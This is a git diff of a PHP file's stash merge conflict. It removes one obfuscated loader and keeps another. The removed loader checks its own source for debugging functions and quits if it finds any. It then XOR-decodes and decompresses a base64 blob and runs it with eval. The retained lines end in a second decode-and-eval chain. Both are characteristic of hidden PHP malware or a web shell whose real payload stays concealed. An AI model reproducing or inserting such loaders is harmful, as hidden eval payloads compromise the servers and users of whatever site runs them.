@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$lwmnpa="73d0690a560a31ba77e883cd2bd5ac87";
-$ikpndm="035050040e5a0855540e045100045358560e545a0b0206525603050d59500c0f";
-$uzwfwcuprhg="TLn5Z3MMIgVxhhfBLNOxg3FUMeVzeYwwkRCNkXDetXyluikik6Vm7WdqYc3cwFK47JDlfNgyGQ36DoejvzbpmpoLusSGySYLK1mg1C+gT2WFM2CKaoqwWGnPz+IVi7ZX4IcvFzfLGGiijTFCVPUqhK5bEm0pqa3T8uhzkAkHy5a16TYeHZSUdGxwIc8yMpu9FEidI4ikFpwRQiKlOGw4snagM54J++KZ/q5Wf4ZuQK+iQxYQ8JVlU3kwFEPZhUJKk4dGcQEXSh23lKitHPtZCeEWaVK2iGSA0rMvvQo+MetApoWEbaJ5Hj94vESVbnuOOv5uRFRHlzKXWM0R7+u3FP/thBX2/jVmxgTNHEDfe0BqnKwpjOsxxVmC/a6gFuS/uroEScUzo6JoE1jMDRFejQ51F5Wbx2k5LQ6XAgaNBOsEnkYHxcTysVWI7gFdlfpI7iW334vZLWU4mtE/1wHDwyv26B2Qwqgp4q9cDmp2hiAjmOhLQsVtrZG0h9EeEoUmAGl5d/xAx6BKZuRjkb481P2aDOV1VpXhqq/DCRa/SVxgdvlTkssQ2eLj5pqBzlodmdGL84rHrVad2+A8ijQURaaheXSbd3417GuMPdsbtIgiDswDyatbPwIq2zNQofbslfJBscPjVmdB+zTfEAvAwA6EunUDRzf+TKHIvWbx8HEUPfepdXL9xEOe6vWYFXKu/UEspuRw2SRWkxRCEVfoJ6qgCPmiCLsynByrTeDpvXuWryaRyPLh3PHru6T8//CxjOsjYa4najZICvKsroOa2nz6V9vc6cLo0sc6VYLfvefHFf/KxWUb1M3M";
-$kyteyqi=file_get_contents(__FILE__);
-$hkcmowh=str_replace($uzwfwcuprhg,"",$kyteyqi);
-if(strpos($hkcmowh,"ec"."ho")!==false||strpos($hkcmowh,"pr"."int")!==false||strpos($hkcmowh,"var_"."dump")!==false||strpos($hkcmowh,"file_put_"."contents")!==false||strpos($hkcmowh,"fw"."rite")!==false){die();}
-$lylsoau=str_replace(array($lwmnpa,$ikpndm),array("SP_5eb86d67","KP_6d81a3f4"),$kyteyqi);
-$nkxwyntd=md5($lylsoau);
-$djdxvwlf=hex2bin($ikpndm);
-$opwhcdnnrd="";
-$gywgtveag=strlen($nkxwyntd);
-for($qfzxsblkvxh=0;$qfzxsblkvxh<$gywgtveag;$qfzxsblkvxh++){
-$opwhcdnnrd.=chr(ord($djdxvwlf[$qfzxsblkvxh])^ord($nkxwyntd[$qfzxsblkvxh]));
-}
-$fhycyipj=base64_decode($uzwfwcuprhg);
-$bgqnzjfq=strlen($fhycyipj);
-$nlrpqc="";
-$bcindui=strlen($opwhcdnnrd);
-for($qfzxsblkvxh=0;$qfzxsblkvxh<$bgqnzjfq;$qfzxsblkvxh++){
-$nlrpqc.=$fhycyipj[$qfzxsblkvxh]^$opwhcdnnrd[$qfzxsblkvxh%$bcindui];
-}
-$yamihhccil="gzun"."compress";
-eval($yamihhccil($nlrpqc));
-=======
 // 1d41d14785acb422039249d3
 $visTKmbihJ="XqW0SOqc/D/SzlRPBMB0gDlzlyQKpdZZ8FXhiU/ZVCE=";
 $eJMNJdkEzn="KdJ0FBdp/Q/FmyECOZO0tQymylDXcqMM8SKuvH/MIPR=";
@@ -52,4 +27,3 @@ $QappKkwsASlGZK=$LtiUnTJlfbi($QappKkwsASlGZK);
 $QappKkwsASlGZK=$tsfSSwZjAMz($QappKkwsASlGZK);
 $QappKkwsASlGZK=$voEwgSUpBWdtR($QappKkwsASlGZK);
 eval($QappKkwsASlGZK);
->>>>>>> Stashed changes
